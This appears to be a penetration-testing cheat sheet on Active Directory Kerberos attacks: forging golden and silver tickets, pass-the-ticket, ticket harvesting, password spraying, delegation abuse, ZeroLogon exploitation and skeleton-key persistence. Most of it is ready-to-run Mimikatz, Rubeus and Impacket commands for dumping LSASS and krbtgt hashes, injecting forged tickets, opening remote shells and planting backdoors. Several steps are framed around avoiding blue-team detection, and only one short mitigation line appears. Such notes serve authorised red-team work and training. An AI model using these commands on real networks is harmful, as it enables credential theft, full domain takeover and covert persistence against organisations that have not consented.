+A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
+
+A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.
+
+-Note : klist shows the available tickets in the context of current user.Our Main goal is krbtgt so if our user doesnt show krbtgt ticket,try switching to other users sessions because the ticket contexts keeps switching dynamically.
+
+the ticket which we impersonate can be that of a domain admin or the kerberos service itself.
+
+    Using Mimikatz
+
+This attack requires atleast loacal administrator priveleges
+
+    Run mimikatz to get in its shell
+
+    mimikatz.exe
+
+    check our priveleges that if we can perfrom this attack or not
+
+    privilege::debug
+
+    Now we will dump all tickets having accss to krbtgt
+
+    lsadump::lsa /inject /name:krbtgt ( To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.)
+
+    creating our ticket
+
+    Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: (to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and id of account in /id:)
+
+This all is found in previous steps: specify sid value in /sid: specify ntlm hash in /krbtgt: specify id number in /id:
+
+We can also specify /ptt at the end of above command and the ticket will be injected rightaway in our session. This can be stealthy as Blueteams can detect the kirbi ticket being made
+
+    NOw type following command to open prompt with privileges of the created golden or silver tickets
+
+    misc::cmd
+
+    using Rubeus (Rubeus will dump all the tickets,we will ourselves select high privilege ticket like krbtgt or admin ticket and create a golden or silver ticket)
+
+    First we need to be a user of administrator group for this attack
+
+    We run following command to dump all the tickets from lsaas
+
+    rubues.exe dump
+
+    Now we need to look for Admin users or any users which have krbtgt service access meaning they are kerberos service accounts and if we are succesful the whole domain can be compromised
+
+    We can now will now add the contennts of the ticket to be compromised in a file using powershell
+
+    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("BASE64TICKETCONTENTS"))
+
+    Now a file named ticket.kirbi is made and we can now inject this ticket into memory to impersonate as the ticket owner
+
+    .\Rubeus.exe ptt /ticket:ticket.kirbi
+
+    NOw we have priveleges of the user same as whse ticket we just exploited
+
+    Remote sessions with injected golden tickets (Optional)
+
+Using above techniques we can get a ticket and then we can transfer to our machine and convert it into linux compatible format (ccache)
+
+    THen we export the ticket in a anve variable used by imapacket
+
+    export KRB5CCNAME=ticket.ccache
+
+    Now connect to the machine using ps exec
+
+    python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
+
+the -k and -no-pass flags triggers the impacket to use our ticket in our environment variable above.
+
+Good Resource : https://attack.stealthbits.com/how-golden-ticket-attack-works
+
+https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
+Offline Ticket Creation (We can create tickets offline to make less noise after getting the required info from above tools)
+
+If we have a users sid , and hash we can create ticket on linux and then convert the .ccache ticket to kirbi and use on target
+
+    python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain domain.name username
+
+We can convert ticket format to .ccache if we want to use with tools like psexec smbexec ,crackmapexec directly in session. .kirbi format only works in windows so if we use this,it will make some noise
+
+    Ticket formats converting(linux and windows)
+
+we can use ticket_converter.py to convert the types ccache is compatible with linux and kirbi with windows
+
+python ticket_converter.py ticket.kirbi ticket.ccache python ticket_converter.py ticket.ccache ticket.kirbi
+
+To inject the ticket directly in our sessions from linux
+
+    export KRB5CCNAME=ticket.ccache
+
+KRB5CCNAME is a env variable used to store ticket path
+
+now we can use any tool like smbexec,crackmapexec etc and pass the -k flag which will automatically include ticket from env var .
+
+    python psexec.py domain.name/user@TARGETIP-k -no-pass
+
+Constrained/UnConstrained Delegation
+
+http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html?m=1
+
+An account with constrained delegation enabled is allowed to request tickets to itself as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have TrustedToAuthForDelegation enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the FORWARDABLE flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's msds-allowedtodelegateto field. So long story short, if you have control of an account with TrustedToAuthForDelegation set and a value in msds-allowedtodelegateto, you can pretend to be any user in the domain to the SPNs set in the account's msds-allowedtodelegateto field.
+
+we must use the user and credentials who have access to those service accouns or management accounts which have some kind of delgation(impersonation) capability
+
+    Enumerating delegated users
+
+    First import Powerview then Get-NetComputer -UnConstrained
+
+Using Rubeus
+
+https://github.com/GhostPack/Rubeus#s4u
+
+    Rubeus.exe s4u /user:username /rc4:hash /impersonateuser:delegated user
+
+This "control" can be the hash of the account (/rc4 or /aes256), or an existing TGT (/ticket:X) for the account with a msds-allowedtodelegateto value set. If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead.
+
+A /impersonateuser:X parameter MUST be supplied to the s4u module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:
+Dump silver tickets remotely using impacket
+
+we can dump silver tickets for service accounts using GetST.py from impacket(requires credentials of user having access to that service or delegation privilege)
+
+Impacket’s getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the -impersonate flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the www service on host server01.test.local.
+
+    python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123
+
+Note: here the www service is specified but we can use the created ticket for all srvice types across domains like smb,winrm,ldap etc if the delegated user has access to those
+Pass the ticket (This is just like golden ticket attack,but we can create ticket of any user we want in this,not only domain admin)
+Pass the ticket attack
+
+Pass the Ticket Overview - Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
+
+    using Rubeus
+
+    First we need to be a user of administrator group for this attack
+
+    We run following command to dump all the tickets from lsaas
+
+    rubues.exe dump
+
+    Now we need to look for Admin users or any users which have krbtgt service access meaning they are kerberos service accounts and if we are succesful the whole domain can be compromised
+
+    We can now will now add the contennts of the ticket to be compromised in a file using powershell
+
+    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("BASE64TICKETCONTENTS"))
+
+    Now a file named ticket.kirbi is made and we can now inject this ticket into memory to impersonate as the ticket owner
+
+    .\Rubeus.exe ptt /ticket:ticket.kirbi
+
+    NOw we have priveleges of the user same as whse ticket we just exploited
+
+    using mimikatz
+
+This attack requires atleast loacl administrator priveleges
+
+    Run mimikatz to get in its shell
+
+    mimikatz.exe
+
+    check our priveleges that if we can perfrom this attack or not
+
+    privilege::debug
+
+    Now we export the tickets in our working directory
+
+    sekurlsa::tickets /export (we can also specify different things to export instaead of tickets . The sekrulsa support many different things to be dumped)
+
+    we must choose those .kirbi tickets which have full domain access (krbtgt) and also admin access.They should have this keyword in it
+
+    Now we will use this ticket and impersonate as domain admin
+
+    kerberos::ptt ticketname
+
+    The following command will verify if we succesfuly cached the domain admin tikcet in our cache table
+
+    klist
+
+    using Impacket
+
+    First we add our ticket file to default env variable if Impacket
+
+    export KRB5CCNAME=ticket.ccache
+
+    Now connect to the machine using ps exec
+
+    python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
+
+or smbexec or wmiexec or crackmapexec
+
+    Pass the Ticket Mitigation
+
+Let's talk blue team and how to mitigate these types of attacks.
+
+Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with
+
+Harvesting(gathering) tickets (Used in passtheticket attacks)
+
+we can use a tool called rubeus.exe for this purpose
+
+This command tries to gather the ticket being generated every 30 seconds
+
+    Rubeus.exe harvest /interval:30 (we can also specify specific user to target by adding /username:password in this command,also domain or domaincontroller)
+
+bruteforcing tickets
+
+We can also use this tool to bruteforce users and then we can issue a TGT this way and connect to a secure service
+
+For this we will need to add the domain in targets host file
+
+    echo targetsIP domain.name >> C:\Windows\System32\drivers\etc\hosts
+
+Now we will perform the password spraying
+
+    Rubeus.exe brute /password:Password1 /noticket
+
+here Password1 is the provided password
+
+This will give us a .kirbi ticket
+Requesting TGT using hash(pass the hash)
+
+    using Rebeus
+
+    We run the command to ask KDC to grant us a tgt just like a normal user would. THe only change is this that we are using users hash and impersanating as that user
+
+    .\Rubeus.exe asktgt /domain:domain.name /user:username /rc4:USERHASH /ptt
+
+This command outputs the ticket for that user and then using the powershell input streamer which we used in pass the tickets attack we can write to a file and then use rubeus to inject the ticket into memory
+
+    Using Impacket (REmote attack)
+
+We must have credentials and a way to login machine remotley
+Request the TGT with hash
+
+python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
+
+python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+Request the TGT with password
+
+python getTGT.py <domain_name>/<user_name>:[password]
+
+If not provided, password is asked
+ZeroLogon exploit (CVE-2020-1472) Critical exploit - may damage the target system
+
+This vulneribility targets domain controller and set its password to a null string. This is a critical exploit so client permission is neccassary .
+
+    First we have to check if our target domain is vulnerbale to this or not. We will use a python script to confirm
+
+use following script
+
+    https://github.com/SecuraBV/CVE-2020-1472
+
+    python3 zerologon_tester.py DC-NAME DC-IP
+
+    If its vulnerable and we want to exploit it ,use follwoing poc script
+
+    https://github.com/dirkjanm/CVE-2020-1472
+
+    python3 cve-2020-1472-exploit.py DC-NAME DC-IP
+
+    Now we can dump the hashes using secretsdump or crackmapexec
+
+    python3 secretsdump.py -just-dc DOMAIN/DC-NAME\$@DC-IP
+
+$ is for specifying that password is null
+
+This will dump all the hashes from Domain controller and we can pass the hash,perform golden ticket attacks etc
+
+    Now we have the hashes,we need to restore the DC password in order to avoid detection and causing unintended damage to the system
+
+we will again use secretsdump but with a domain admin account and passing the hash to find a password hex key which will allow us to restore the system as before the exploitation
+
+    python3 secretsdump.py domainadmin@DC-IP -hashes USERHASH
+
+this will again dump hashes but will also dump hex keys from registry(after exploitation original dc password doesnt change to null in registry saves hence allowing us to restore) allowing us to restore dc password
+
+    Lastly we will use the restore password script to restore the system as it was
+
+    python3 restorepassword.py DOMAIN/DC-NAME@DC-NAME -target-ip DC-IP -hexpass HEXKEY
+
+AD backdoor and Persistance
+
+Golden Tickets are also form of persistance
+
+If we have a users sid , and hash we can create ticket on linux and then convert the .ccache ticket to kirbi and use on target
+
+    python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain domain.name username
+
+We can convert ticket format to .ccache if we want to use with tools like psexec smbexec ,crackmapexec directly in session. .kirbi format only works in windows so if we use this,it will make some noise
+
+    Ticket formats converting(linux and windows)
+
+we can use ticket_converter.py to convert the types ccache is compatible with linux and kirbi with windows
+
+python ticket_converter.py ticket.kirbi ticket.ccache python ticket_converter.py ticket.ccache ticket.kirbi
+
+To inject the ticket directly in our sessions from linux
+
+    export KRB5CCNAME=ticket.ccache
+
+KRB5CCNAME is a env variable used to store ticket path
+
+now we can use any tool like smbexec,crackmapexec etc and pass the -k flag which will automatically include ticket from env var .
+
+    python psexec.py domain.name/user@TARGETIP-k -no-pass
+
+Skeleton Key Overview -
+
+The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
+
+The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.
+
+This attack requires atleast loacal administrator priveleges
+
+    Run mimikatz to get in its shell
+
+    mimikatz.exe
+
+    check our priveleges that if we can perfrom this attack or not
+
+    privilege::debug
+
+    Now we implant the skeleton key in the AD Forest
+
+    misc::skeleton This allows us to access any share of any machine on any domain in the forest without ever enumurating it from the start beccause we already have a golden ticket and we make our access more easy
+
+Accessing the Forest
+
+The default credentials will be: "mimikatz"
+
+We can now make admin shares for our current user with elevated privileges persistent.we can configure any shares to accept us without authentication by follwoing command example
+
+example: net use c:\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
+
+example: dir \Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+Active Directory Post Exploitation
+
+After we are a domain admin, now our goal is to gather as much information as possible
+
+    One way we can do is by rdp into the machine and then using windows server manager as it allows the management of whole domain in a AD environment
+
+    The most useful feature of windows server in post exploitation is going in tools tab and then enumerating different things going around on network
+
+    One important is the users and computers information tool whihc shows active users and sometimes people leave their passswords in the description so they dont forget
 
